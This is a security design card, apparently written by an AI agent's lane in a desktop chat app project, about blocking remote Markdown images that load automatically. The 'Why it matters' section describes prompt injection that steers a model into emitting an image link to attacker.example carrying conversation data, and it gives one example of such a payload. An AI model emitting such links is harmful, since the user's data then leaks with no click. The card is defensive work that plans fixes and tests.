# IMG1: Markdown images from the web load on their own

⑥Helper, 2026-11-01. Found while carding #603's follow-up ("the reader's Markdown renders `<img>` for any URL"). That follow-up is wider than the reader: **chat replies render the same way.** This is the security surface, so the card came first and the user picked the scope: **A + C now, B later** (Decided, below).

| | |
|---|---|
| Lane | ⑥Helper |
| Review and merge | Another session's independent review at effort=max (security surface). Under the user's 2026-11-01 rule (`docs/sessions.md`, #644), ⑥Helper may enable auto-merge once that review is OK at the current head and all five checks are green. |
| Branch | `claude/0164-img1` (code), after this card |
| Tier | **should**, in v0.1.64 (user, 2026-11-01). |

## What is there (main `845feff8`)

- **One renderer for three places.** `web/src/components/Markdown.tsx:543-555` maps every Markdown image to `<img src={src}>` with no check on `src`. react-markdown's default URL check only drops unsafe schemes such as `javascript:`, so `https://` passes. Users:
  - **chat replies**, `MessageBody.tsx:295`;
  - **the reader**, `workbench/Reader.tsx:147`, for `.md` files (for example a rules file opened from Overview);
  - **release notes**, `settings/AboutSection.tsx:26`.
- **No CSP on the main window.** The app loads `http://127.0.0.1:<port>` (`desktop/src-tauri/src/lib.rs:871-878`), and `server/main.py:736-780` serves `index.html` without a `Content-Security-Policy` header. `tauri.conf.json` has `"csp": null`, which only covers Tauri's own pages (the splash; `recovery.html` has its own).
- **The reader's HTML frames.** HTML files and Word files show in `<iframe sandbox="" srcDoc=…>` (`Reader.tsx:150`, `:163`). `sandbox=""` stops scripts and same-origin access, but **not** image loads, so `<img src="https://…">` in such a file loads too.
- **Every other `<img>`** in the web app is the app's own (`/brand/…`), a `data:` or `blob:` URL, or a URL the server gives (artifacts, screenshots, attachments).

## Why it matters

A reply is the model's text, and the model reads outside content (web pages, files, MCP results). If outside content steers it, a reply with `![](https://attacker.example/p?d=<something from the conversation>)` sends that text to the attacker the moment the reply renders, with no click. This is the known "Markdown image exfiltration" pattern; several chat products shipped fixes for it after public reports. Arslan's hard rules and confirm cards don't see it, because it isn't a tool call: the webview fetches the image.

## Decided (user, 2026-11-01, relayed by ④参谋)

The user's words, verbatim: 「直接按 A + C 做 确实听着靠谱些」. So:

- **A + C, as described below.** No mock first: it's built straight from this card.
- **B** is a follow-up once A has run on a real Mac.
- **Neither extra:** no "Load image" button and no host allowlist, as recommended.

## Options (as they were put to the user)

- **A. Recommended: don't load web images in Markdown.**
  - An image whose URL is `http:`, `https:` or protocol-relative (`//…`) shows as a small chip: an image icon, the alt text, and the host ("Image from example.com"). Clicking it opens the URL in the browser through `openExternal`, the same path as links (`MarkdownLink.tsx`), so the user sees where it goes before anything is sent.
  - `data:` and `blob:` images still render inline. A relative path (`./diagram.png`) also becomes a chip, since it would resolve against Arslan's own server, not the file's folder.
  - One change in `Markdown.tsx`, so it covers chat, the reader and release notes together. About +40 web lines, plus strings in `web/src/locales/workbench.ts` (no JSON locale, #525).
- **B. A plus a CSP on the main window,** as a second layer: `img-src 'self' data: blob:` on the `index.html` response (`server/main.py`). It would also stop a remote image that slips in some other way. Risk: any feature that loads a remote image today breaks. The `<img>` list above says none does, but the PR has to show it on a real Mac (the island and the splash are separate pages and are not covered). About +10 server lines and a test.
- **C. A plus the reader's frames:** put `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'">` at the start of each `srcDoc`. HTML and Word previews then load nothing from the web. About +10 web lines.

**Recommended: A + C now; B as a follow-up once A has been on a real Mac.** A and C close the two paths found; B is the safety net, and it touches every page load, so it's safer on its own.

**Extras, for the user to decide (not in any option above):**
- A "Load image" button on the chip, as a per-image choice. It brings the leak back if the user clicks it on a crafted URL, so it isn't recommended.
- An allowlist of image hosts (for example GitHub's). It isn't recommended either: an open redirect or a user-content host on the list reopens the channel.

## Not here

- The iPhone app's Markdown (①iOS lane). If the phone renders reply images from URLs, it has the same issue; ①iOS checks it and cards it separately.
- Exported message HTML (`MessageBody.tsx:123`): a file the user saves and opens in a browser, outside the app.
- Links. A link needs a click, and `openExternal` already enforces HTTPS natively.

## Four lines (`docs/sessions.md` §6)

1. **References:**
   - Simon Willison's write-ups of the pattern and of vendor fixes: `simonwillison.net/tags/markdown-exfiltration/`.
   - GitHub proxies every Markdown image through its own server (camo), so the viewer's browser never contacts the image's host: `docs.github.com/en/authentication/keeping-your-account-and-data-secure/about-anonymized-urls`.
   - A proxy isn't recommended for Arslan: it would make the Mac's server fetch the URL, which still sends the data.
2. **Raw material:** the file:line list under "What is there".
3. **Method:**
   - **Failing tests first** (vitest), on `Markdown`:
     - `![x](https://h.example/p?d=1)` renders no `<img>`, and renders a chip with `h.example`;
     - the same for `http:`, `//h.example/…` and a relative path;
     - a `data:image/png;base64,…` image still renders an `<img>`;
     - clicking the chip calls `openExternal` with the URL;
     - the same check through `MessageBody` and through the reader, so all three users are covered.
   - **For C:** the reader's `srcDoc` starts with the CSP meta, for HTML and for Word.
   - **For B (if picked):** a server test that `index.html` carries the header.
   - **Mutants, each restored from a backup and checked with `diff`:**
     - the scheme check removed;
     - `//` treated as relative;
     - the meta dropped from one frame.
4. **External evidence:**
   - CI run cited.
   - On a real Mac:
     - a reply containing a web image shows the chip, and Web Inspector's Network tab shows no request to that host;
     - a rules file with an image does the same in the reader;
     - an HTML file with a remote `<img>` loads nothing.
